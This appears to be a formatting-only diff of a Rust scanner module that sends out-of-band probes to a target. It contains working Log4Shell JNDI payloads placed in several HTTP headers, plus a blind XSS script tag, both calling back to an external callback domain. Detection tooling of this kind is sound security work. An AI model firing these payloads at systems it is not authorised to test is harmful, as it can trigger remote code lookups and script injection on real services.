@@ -48,19 +48,10 @@ pub async fn run_oast_oob_result(target: &str) -> EngineResult {
     let log4shell_payload = format!("${{jndi:ldap://{}/a}}", oast_domain);
     let log4shell_payloads = [
         ("User-Agent", log4shell_payload.clone()),
-        (
-            "X-Forwarded-For",
-            format!("${{jndi:ldap://{}/xff}}", oast_domain),
-        ),
-        (
-            "X-Api-Version",
-            format!("${{jndi:ldap://{}/api}}", oast_domain),
-        ),
+        ("X-Forwarded-For", format!("${{jndi:ldap://{}/xff}}", oast_domain)),
+        ("X-Api-Version", format!("${{jndi:ldap://{}/api}}", oast_domain)),
         ("Referer", format!("${{jndi:ldap://{}/ref}}", oast_domain)),
-        (
-            "X-Request-ID",
-            format!("${{jndi:ldap://{}/rid}}", oast_domain),
-        ),
+        ("X-Request-ID", format!("${{jndi:ldap://{}/rid}}", oast_domain)),
     ];
 
     let mut log4shell_sent = false;
@@ -121,7 +112,10 @@ pub async fn run_oast_oob_result(target: &str) -> EngineResult {
     }));
 
     // Blind XSS probe — inject into form fields / query params
-    let bxss_payload = format!(r#""><script src="http://{}"></script>"#, oast_domain);
+    let bxss_payload = format!(
+        r#""><script src="http://{}"></script>"#,
+        oast_domain
+    );
     let search_url = format!(
         "{}?q={}&search={}&query={}",
         base.trim_end_matches('/'),
@@ -173,11 +167,7 @@ pub async fn run_oast_oob_result(target: &str) -> EngineResult {
 
     EngineResult::ok(
         findings.clone(),
-        format!(
-            "OASTOOB: {} probes sent, monitor {} for callbacks",
-            findings.len(),
-            oast_domain
-        ),
+        format!("OASTOOB: {} probes sent, monitor {} for callbacks", findings.len(), oast_domain),
     )
 }
 
